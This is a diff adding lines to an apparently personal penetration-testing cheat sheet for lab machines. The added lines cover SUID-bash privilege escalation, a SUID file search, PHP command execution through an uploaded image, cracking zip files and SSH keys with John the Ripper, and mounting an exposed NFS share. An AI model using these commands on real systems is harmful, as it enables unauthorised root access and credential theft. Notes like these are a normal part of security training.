@@ -28,8 +28,38 @@ ssh -i id.rsa user@10.10.10.10
 
 #Privledge Escalation
 
+sudo -l
 chmod +s /bin/bash 
 cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell
 
+
+below to find SUID binaries
+find / -perm -4000 2>/dev/null 
+
 https://www.revshells.com/
+
+PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes
+
+website.com/index.php?pg=/uploads/image.lol?cmd=ls
+
+Could also use a straight PHP reverse shell payload
+
+#Using John The Ripper
+
+To crack a password-protected zip file, first convert it into a hash that John can read
+zip2john file-to-crack.zip > hashed.john
+And then call John on it
+john -w=/usr/share/wordlists/rockyou.txt hashed.john
+
+To crack a SSH key
+ssh2john encrypted-id.rsa > id.rsa.john
+john -w=/usr/share/wordlists/rockyou.txt id.rsa.john
+
+#Other
+bash -i to make the improvised root shell look nice
+
+#abusing NFS
+sudo showmount -e 10.10.10.10
+mkdir mnt
+sudo mount -t nfs 10.10.10.10:/ ./mnt -o nolock
 
